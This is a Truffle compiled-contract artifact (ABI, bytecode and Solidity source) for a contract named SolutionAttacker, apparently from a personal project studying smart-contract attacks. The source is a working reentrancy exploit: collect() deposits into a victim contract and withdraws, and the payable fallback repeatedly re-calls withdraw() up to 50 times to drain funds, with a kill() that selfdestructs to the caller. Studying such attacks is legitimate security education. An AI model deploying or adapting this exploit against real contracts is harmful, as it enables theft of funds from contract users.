{
  "contractName": "SolutionAttacker",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "solutionVictim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_victim",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "_count",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallback",
      "type": "event"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b60405160208061042d83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103b28061007b6000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306661abd1461017257806341c0e1b51461019b578063c9bf657a146101b0578063e522538114610205575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f16001543073ffffffffffffffffffffffffffffffffffffffff1631604051808381526020018281526020019250505060405180910390a160016000815480929190600101919050555060326001541015610170576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561015b57600080fd5b6102c65a03f1151561016c57600080fd5b5050505b005b341561017d57600080fd5b61018561020f565b6040518082815260200191505060405180910390f35b34156101a657600080fd5b6101ae610215565b005b34156101bb57600080fd5b6101c361022e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61020d610253565b005b60015481565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15156102d757600080fd5b6125ee5a03f115156102e857600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561037057600080fd5b6102c65a03f1151561038157600080fd5b5050505600a165627a7a7230582034c58a1ce8ff295f436481a0d32a2bfa7e7fc5fcf32f73cbe476e01aa7da367d0029",
  "source": "pragma solidity ^0.4.18;\n\nimport './SolutionVictim.sol';\n\ncontract SolutionAttacker {\n\n  SolutionVictim public solutionVictim;\n  uint public count;\n\n  event LogFallback(uint _count, uint _balance);\n\n  function SolutionAttacker(address _victim) {\n    solutionVictim = SolutionVictim(_victim);\n  }\n\n  function collect() payable {\n    solutionVictim.deposit.value(msg.value)();\n    solutionVictim.withdraw();\n  }\n\n  function kill() {\n    selfdestruct(msg.sender);\n  }\n\n  function() payable {\n    LogFallback(count, this.balance);\n    count++;\n    if (count < 50) {\n      solutionVictim.withdraw();\n    }\n  }\n\n}\n",
  "sourcePath": "/Users/christophercoverdale/Desktop/Projects/solidity/contract-attacks/contracts/SolutionAttacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2018-03-10T11:52:39.703Z"
}